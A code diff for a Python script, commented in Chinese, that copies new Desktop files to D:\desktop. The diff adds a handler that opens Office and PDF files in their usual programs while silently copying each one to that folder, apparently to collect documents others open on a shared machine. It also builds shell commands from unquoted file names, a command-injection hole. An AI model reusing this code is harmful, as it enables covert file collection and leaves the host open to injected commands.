@@ -4,11 +4,31 @@
 
 TARGET = 'D:\\desktop'
 
-import os,time,shutil,sys
+import os,time,shutil,sys,threading
 
 os.chdir(os.path.join(os.path.expanduser('~'),'Desktop'))
 filenum = len(os.listdir())
 
+def execute_with_arg():
+    if len(sys.argv) == 2:
+        filename = sys.argv[1]
+        file_suffix = filename.split('.')[-1]
+        if file_suffix in ('doc','docx'):
+            threading.Thread(target=lambda:os.system(f'winword {filename}')).start()
+            shutil.copy(filename,os.path.join(TARGET,filename))
+            sys.exit()
+        elif file_suffix in ('ppt','pptx'):
+            threading.Thread(target=lambda:os.system(f'powerpnt {filename}')).start()
+            shutil.copy(filename,os.path.join(TARGET,filename))
+            sys.exit()
+        elif file_suffix in ('xls','xlsx'):
+            threading.Thread(target=lambda:os.system(f'excel {filename}')).start()
+            shutil.copy(filename,os.path.join(TARGET,filename))
+            sys.exit()
+        elif file_suffix in ('pdf',):
+            threading.Thread(target=lambda:os.system(fr'C:\Users\SEEWO\AppData\Roaming\secoresdk\360se6\Application\360se {filename}')).start()
+            shutil.copy(filename,os.path.join(TARGET,filename))
+            sys.exit()
 def is_file_number_change():
     '''检测是否出现新文件
 返回值:当前（改变后的）文件列表(list)
@@ -40,6 +60,7 @@ def main():
     root.after(1000,main)
 """
 def main():
+    execute_with_arg()
     print(f'已于 {time.strftime("%Y.%m.%d %H:%M:%S")} 启动')
     while True:
         if is_file_number_change():
@@ -51,7 +72,7 @@ def main():
                         target = os.path.join(TARGET,j)
                         shutil.copy(filename,target)
                         print(f'已复制 {filename} at {time.strftime("%Y.%m.%d %H:%M:%S")}')
-        time.sleep(5 if len(sys.argv) == 1 else 1)    #如果传入参数就是调试模式，缩短间隔时间
+        time.sleep(5)
 
 if __name__ == '__main__':
     main()
